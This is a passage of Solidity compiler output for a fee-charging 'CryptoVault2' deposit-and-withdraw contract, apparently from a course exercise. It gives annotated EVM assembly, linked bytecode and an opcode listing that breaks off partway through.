9/CryptoVault2.sol\":2617:2623  prcFee */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":2605:2623  msg.value * prcFee */\n      0xff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":2605:2614  msg.value */\n      callvalue\n        /* \"PRACTICA 9/CryptoVault2.sol\":2605:2623  msg.value * prcFee */\n      mul\n        /* \"PRACTICA 9/CryptoVault2.sol\":2605:2631  msg.value * prcFee / 10000 */\n      dup2\n      tag_33\n      jumpi\n      invalid\n    tag_33:\n      div\n        /* \"PRACTICA 9/CryptoVault2.sol\":2594:2631  uint fee = msg.value * prcFee / 10000 */\n      swap1\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":2700:2703  fee */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":2688:2697  msg.value */\n      callvalue\n        /* \"PRACTICA 9/CryptoVault2.sol\":2688:2703  msg.value - fee */\n      sub\n        /* \"PRACTICA 9/CryptoVault2.sol\":2664:2672  accounts */\n      0x03\n        /* \"PRACTICA 9/CryptoVault2.sol\":2664:2684  accounts[msg.sender] */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":2673:2683  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":2664:2684  accounts[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":2664:2703  accounts[msg.sender] += msg.value - fee */\n      dup3\n      dup3\n      sload\n      add\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":2787:2790  fee */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":2770:2783  collectedFees */\n      0x01\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":2770:2790  collectedFees += fee */\n      dup3\n      dup3\n      sload\n      add\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":2489:2798  function deposit() public payable{\r... */\n      pop\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":2933:3263  function withdraw(uint _amount) public {\r... */\n    tag_16:\n        /* \"PRACTICA 9/CryptoVault2.sol\":3029:3030  0 */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":2992:3025  accounts[msg.sender].sub(_amount) */\n      tag_35\n        /* \"PRACTICA 9/CryptoVault2.sol\":3017:3024  _amount */\n      dup3\n        /* \"PRACTICA 9/CryptoVault2.sol\":2992:3000  accounts */\n      0x03\n        /* \"PRACTICA 9/CryptoVault2.sol\":2992:3012  accounts[msg.sender] */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":3001:3011  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":2992:3012  accounts[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"PRACTICA 9/CryptoVault2.sol\":2992:3016  accounts[msg.sender].sub */\n      tag_36\n      swap1\n        /* \"PRACTICA 9/CryptoVault2.sol\":2992:3025  accounts[msg.sender].sub(_amount) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_35:\n        /* \"PRACTICA 9/CryptoVault2.sol\":2992:3030  accounts[msg.sender].sub(_amount) >= 0 */\n      lt\n      iszero\n        /* \"PRACTICA 9/CryptoVault2.sol\":2983:3053  require (accounts[msg.sender].sub(_amount) >= 0, \"Insufficient funds\") */\n      tag_37\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x12\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x496e73756666696369656e742066756e64730000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_37:\n        /* \"PRACTICA 9/CryptoVault2.sol\":3112:3145  accounts[msg.sender].sub(_amount) */\n      tag_38\n        /* \"PRACTICA 9/CryptoVault2.sol\":3137:3144  _amount */\n      dup2\n        /* \"PRACTICA 9/CryptoVault2.sol\":3112:3120  accounts */\n      0x03\n        /* \"PRACTICA 9/CryptoVault2.sol\":3112:3132  accounts[msg.sender] */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":3121:3131  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":3112:3132  accounts[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"PRACTICA 9/CryptoVault2.sol\":3112:3136  accounts[msg.sender].sub */\n      tag_36\n      swap1\n        /* \"PRACTICA 9/CryptoVault2.sol\":3112:3145  accounts[msg.sender].sub(_amount) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_38:\n        /* \"PRACTICA 9/CryptoVault2.sol\":3089:3097  accounts */\n      0x03\n        /* \"PRACTICA 9/CryptoVault2.sol\":3089:3109  accounts[msg.sender] */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":3098:3108  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":3089:3109  accounts[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"PRACTICA 9/CryptoVault2.sol\":3089:3145  accounts[msg.sender] = accounts[msg.sender].sub(_amount) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":3157:3166  bool sent */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":3172:3182  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":3172:3187  msg.sender.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":3195:3202  _amount */\n      dup3\n        /* \"PRACTICA 9/CryptoVault2.sol\":3172:3207  msg.sender.call{value: _amount}(\"\") */\n      mload(0x40)\n      dup1\n      0x00\n      add\n      swap1\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_41\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_40)\n        /* \"--CODEGEN--\":14:41   */\n    tag_41:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_40:\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":3156:3207  (bool sent, ) = msg.sender.call{value: _amount}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":3226:3230  sent */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":3218:3255  require(sent, \"Failed to send funds\") */\n      tag_42\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x14\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4661696c656420746f2073656e642066756e6473000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_42:\n        /* \"PRACTICA 9/CryptoVault2.sol\":2933:3263  function withdraw(uint _amount) public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":1543:1587  mapping (address => uint256) public accounts */\n    tag_20:\n      mstore(0x20, 0x03)\n      dup1\n      0x00\n      mstore\n      keccak256(0x00, 0x40)\n      0x00\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":3374:3654  function withdrawAll() public {\r... */\n    tag_23:\n        /* \"PRACTICA 9/CryptoVault2.sol\":3415:3426  uint amount */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":3429:3437  accounts */\n      0x03\n        /* \"PRACTICA 9/CryptoVault2.sol\":3429:3449  accounts[msg.sender] */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":3438:3448  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":3429:3449  accounts[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"PRACTICA 9/CryptoVault2.sol\":3415:3449  uint amount = accounts[msg.sender] */\n      swap1\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":3478:3479  0 */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":3469:3475  amount */\n      dup2\n        /* \"PRACTICA 9/CryptoVault2.sol\":3469:3479  amount > 0 */\n      gt\n        /* \"PRACTICA 9/CryptoVault2.sol\":3460:3502  require (amount > 0, \"Insufficient funds\") */\n      tag_44\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x12\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x496e73756666696369656e742066756e64730000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_44:\n        /* \"PRACTICA 9/CryptoVault2.sol\":3536:3537  0 */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":3513:3521  accounts */\n      0x03\n        /* \"PRACTICA 9/CryptoVault2.sol\":3513:3533  accounts[msg.sender] */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":3522:3532  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":3513:3533  accounts[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"PRACTICA 9/CryptoVault2.sol\":3513:3537  accounts[msg.sender] = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":3549:3558  bool sent */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":3564:3574  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":3564:3579  msg.sender.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":3587:3593  amount */\n      dup3\n        /* \"PRACTICA 9/CryptoVault2.sol\":3564:3598  msg.sender.call{value: amount}(\"\") */\n      mload(0x40)\n      dup1\n      0x00\n      add\n      swap1\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_47\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_46)\n        /* \"--CODEGEN--\":14:41   */\n    tag_47:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_46:\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":3548:3598  (bool sent, ) = msg.sender.call{value: amount}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":3617:3621  sent */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":3609:3646  require(sent, \"Failed to send funds\") */\n      tag_48\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x14\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4661696c656420746f2073656e642066756e6473000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_48:\n        /* \"PRACTICA 9/CryptoVault2.sol\":3374:3654  function withdrawAll() public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":741:761  address public owner */\n    tag_26:\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":868:893  uint public collectedFees */\n    tag_29:\n      sload(0x01)\n      dup2\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3136:3291  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_36:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3194:3201  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3226:3227  a */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3221:3222  b */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3221:3227  b <= a */\n      gt\n      iszero\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3213:3262  require(b <= a, \"SafeMath: subtraction overflow\") */\n      tag_50\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_50:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3283:3284  b */\n      dup2\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3279:3280  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3279:3284  a - b */\n      sub\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3272:3284  return a - b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":3136:3291  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a6be3b3699dfb06603382c8589ec425e0d93b25d2dcc434a0d6acd42eb28538564736f6c63430006040033\n}\n",
						"bytecode": {
							"linkReferences": {
								"PRACTICA 9/CryptoVault2.sol": {
									"VaultLib": [
										{
											"length": 20,
											"start": 97
										}
									]
								}
							},
							"object": "608060405234801561001057600080fd5b5060405161091c38038061091c8339818101604052602081101561003357600080fd5b810190808051906020019092919050505080600260006101000a81548160ff021916908360ff16021790555073__$7c875b79f3c0fa0f993e0efba3531a04ff$__63f09a40166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16336040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060006040518083038186803b15801561012f57600080fd5b505af4158015610143573d6000803e3d6000fd5b50505050506107c5806101576000396000f3fe6080604052600436106100595760003560e01c80632e1a7d4d1461006d5780635e5c06e2146100a8578063853828b61461010d5780638da5cb5b146101245780639003adfe1461017b578063d0e30db0146101a657610068565b36610068576100666101b0565b005b600080fd5b34801561007957600080fd5b506100a66004803603602081101561009057600080fd5b81019080803590602001909291905050506102ad565b005b3480156100b457600080fd5b506100f7600480360360208110156100cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506104ea565b6040518082815260200191505060405180910390f35b34801561011957600080fd5b50610122610502565b005b34801561013057600080fd5b506101396106e1565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561018757600080fd5b50610190610706565b6040518082815260200191505060405180910390f35b6101ae6101b0565b005b6064341015610227576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f496e73756666696369656e74206465706f73697400000000000000000000000081525060200191505060405180910390fd5b6000612710600260009054906101000a900460ff1660ff1634028161024857fe5b049050803403600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508060016000828254019250508190555050565b600061030182600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461070c90919063ffffffff16565b1015610375576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f496e73756666696369656e742066756e6473000000000000000000000000000081525060200191505060405180910390fd5b6103c781600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461070c90919063ffffffff16565b600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d806000811461046a576040519150601f19603f3d011682016040523d82523d6000602084013e61046f565b606091505b50509050806104e6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f4661696c656420746f2073656e642066756e647300000000000000000000000081525060200191505060405180910390fd5b5050565b60036020528060005260406000206000915090505481565b6000600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050600081116105bc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f496e73756666696369656e742066756e6473000000000000000000000000000081525060200191505060405180910390fd5b6000600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d8060008114610661576040519150601f19603f3d011682016040523d82523d6000602084013e610666565b606091505b50509050806106dd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f4661696c656420746f2073656e642066756e647300000000000000000000000081525060200191505060405180910390fd5b5050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600082821115610784576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601e8152602001807f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525060200191505060405180910390fd5b81830390509291505056fea2646970667358221220a6be3b3699dfb06603382c8589ec425e0d93b25d2dcc434a0d6acd42eb28538564736f6c63430006040033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x91C CODESIZE SUB DUP1 PUSH2 0x91C DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0xFF AND MUL OR SWAP1 SSTORE POP PUSH20 0x0 PUSH4 0xF09A4016 PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x12F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS DELEGATECALL ISZERO DUP1 ISZERO PUSH2 0x143 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH2 0x7C5 DUP1 PUSH2 0x157 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x59 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2E1A7D4D EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0x5E5C06E2 EQ PUSH2 0xA8 JUMPI DUP1 PUSH4 0x853828B6 EQ PUSH2 0x10D JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x124 JUMPI DUP1 PUSH4 0x9003ADFE EQ PUSH2 0x17B JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH2 0x1A6 JUMPI PUSH2 0x68 JUMP JUMPDEST CALLDATASIZE PUSH2 0x68 JUMPI PUSH2 0x66 PUSH2 0x1B0 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x79 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA6 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x2AD JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF7 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xCB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x4EA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x119 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x122 PUSH2 0x502 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x130 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x139 PUSH2 0x6E1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x187 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x190 PUSH2 0x706 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1AE PUSH2 0x1B0 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x64 CALLVALUE LT ISZERO PUSH2 0x227 JUMPI PUSH1 0x40 MLOAD PUSH32 